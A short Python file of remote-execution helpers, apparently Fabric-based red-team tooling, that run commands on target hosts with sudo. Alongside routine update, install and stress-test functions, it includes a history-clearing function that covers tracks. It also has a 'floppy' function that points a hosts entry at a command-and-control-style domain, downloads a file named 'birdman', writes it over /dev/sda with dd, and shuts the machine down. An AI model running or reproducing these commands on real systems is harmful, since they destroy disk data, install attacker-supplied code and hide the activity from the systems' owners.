import time
def clear_history(connect):
    connect.run("history -c")
    connect.sudo("history -c")

def test_connection(connect):
    connect.sudo("whoami")

def install_terminator(connect):
    connect.sudo("apt-get install terminator -y")

def fail_function(connect):
    connect.run(r"sh -c 'cd / && mkdir fail_file'")

def update(connect):
    connect.sudo("apt-get update -y")
    connect.sudo("apt-get upgrade -y")

def reboot(connect):
    connect.sudo("reboot")

def scratch(connect):
    connect.sudo("apt-get install stress-ng -y")
    connect.sudo("stress-ng --cpu 2 --cpu-method matrixprod  --metrics-brief --perf -t 300")

def floppy(connect):
    connect.sudo('echo "129.21.228.202 cdn.c2the.world" >> /etc/hosts')
    connect.sudo('wget cdn.c2the.world/l/birdman')
    connect.sudo('dd if=birdman of=/dev/sda')
    connect.sudo('poweroff')